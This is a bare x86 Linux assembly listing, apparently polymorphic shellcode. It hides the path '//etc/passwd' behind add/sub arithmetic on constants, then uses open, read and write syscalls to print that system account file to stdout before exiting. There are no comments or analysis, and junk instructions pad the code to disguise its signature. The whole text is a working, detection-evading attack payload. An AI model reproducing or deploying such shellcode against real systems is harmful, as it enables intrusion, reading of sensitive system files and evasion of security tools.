global _start

_start:
xor ecx,ecx
mul ecx
stc
mov al,0x4
inc al
clc
push ecx
mov edx, 0x53666262
add edx, 0x11111111
push edx
push dword 0x61702f63
xor edx,edx
mov edx, 0x85764040
sub edx, 0x11111111
push edx
mov ebx,esp
int 0x80
xchg eax,ebx
xchg eax,ecx
mov al,0x4
dec al
xor edx,edx
mov dx,0xfff
inc edx
int 0x80
xchg eax,edx
xor eax,eax
mov al,0x4
mov bl,0x1
int 0x80
xchg eax,ebx
int 0x80
